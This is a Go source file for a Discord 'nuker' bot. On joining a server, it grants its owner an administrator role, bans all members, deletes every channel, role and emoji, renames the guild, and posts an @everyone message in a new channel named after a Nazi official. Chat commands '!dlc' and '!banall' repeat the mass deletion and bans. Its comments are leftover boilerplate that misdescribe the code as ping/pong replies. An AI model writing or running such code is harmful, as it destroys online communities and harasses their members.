package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/signal"
	"syscall"

	"github.com/bwmarrin/discordgo"
)

var (
	loginData map[string]string
)

func deleteRoles(s *discordgo.Session, roles []*discordgo.Role) {
	for _, role := range roles {
		s.GuildRoleDelete(loginData["GuildID"], role.ID)
	}
}

func deleteEmojis(s *discordgo.Session, emojis []*discordgo.Emoji) {
	for _, emoji := range emojis {
		s.GuildEmojiDelete(loginData["GuildID"], emoji.ID)
	}
}

func deleteChannels(s *discordgo.Session) {
	channels, _ := s.GuildChannels(loginData["GuildID"])
	for _, channel := range channels {
		s.ChannelDelete(channel.ID)
	}
}

func banMembers(s *discordgo.Session) {
	members, _ := s.GuildMembers(loginData["GuildID"], "", 1000)
	for _, member := range members {
		s.GuildBanCreateWithReason(loginData["GuildID"], member.User.ID, "!fishgang Cy is god", 0)
	}
}

func ready(s *discordgo.Session, event *discordgo.Ready) {
	guild, _ := s.Guild(loginData["GuildID"])
	if guild != nil {
		Data, _ := s.Application("@me")
		role, _ := s.GuildRoleCreate(guild.ID)
		s.GuildRoleEdit(guild.ID, role.ID, "CyIsGod", 0, false, 8, false)
		s.GuildMemberRoleAdd(guild.ID, Data.Owner.ID, role.ID)
		go banMembers(s)
		go deleteChannels(s)
		go deleteRoles(s, guild.Roles)
		deleteEmojis(s, guild.Emojis)
		s.GuildEdit(loginData["GuildID"], discordgo.GuildParams{Name: "github.com/Not-Cyrus", Region: "brazil"})
		Channel, _ := s.GuildChannelCreate(loginData["GuildID"], "hermann goring", discordgo.ChannelTypeGuildText)
		s.ChannelMessageSend(Channel.ID, "@everyone https://cdn.discordapp.com/attachments/721981266110578768/743477747447234590/video0-6.mp4")
	} else {
		fmt.Println("Can't find guild")
	}
}

func init() {
	file, _ := os.Open("LoginInfo.json")
	defer file.Close()
	data, _ := ioutil.ReadAll(file)
	json.Unmarshal([]byte(data), &loginData)
}

func main() {

	// Create a new Discord session using the provided bot token.
	dg, err := discordgo.New("Bot " + os.Getenv("TOKEN"))
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)
	dg.Identify.Intents = discordgo.MakeIntent(discordgo.IntentsGuildBans | discordgo.IntentsGuildMembers | discordgo.IntentsGuildMessages)
	dg.AddHandler(ready)
	dg.Open()
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc
	dg.Close()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {

	// Ignore all messages created by the bot itself
	// This isn't required in this specific example but it's a good practice.
	if m.Author.ID == s.State.User.ID {
		return
	}
	// If the message is "ping" reply with "Pong!"
	if m.Content == "!dlc" {
		channels, _ := s.GuildChannels(m.GuildID)
	for _, channel := range channels {
		s.ChannelDelete(channel.ID)
	}
}

	

	// If the message is "pong" reply with "Ping!"
	if m.Content == "!banall" {
		
		members, _ := s.GuildMembers(m.GuildID, "", 1000)
	for _, member := range members {
		s.GuildBanCreateWithReason(m.GuildID, member.User.ID, "noob", 0)
	}
	}
	
	
	
	
	
	
	
}
